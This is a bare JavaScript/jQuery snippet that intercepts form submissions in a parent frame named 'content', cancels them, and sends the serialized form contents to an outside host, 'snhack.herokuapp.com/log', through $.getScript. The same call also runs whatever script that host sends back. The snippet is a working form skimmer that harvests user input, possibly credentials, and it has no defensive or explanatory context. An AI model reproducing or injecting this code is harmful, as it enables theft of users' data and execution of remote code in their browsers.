$("form", window.parent.frames["content"].document).submit(function(e){
    e.preventDefault();
    $.getScript('//snhack.herokuapp.com/log?'+ $(this).serialize());
});
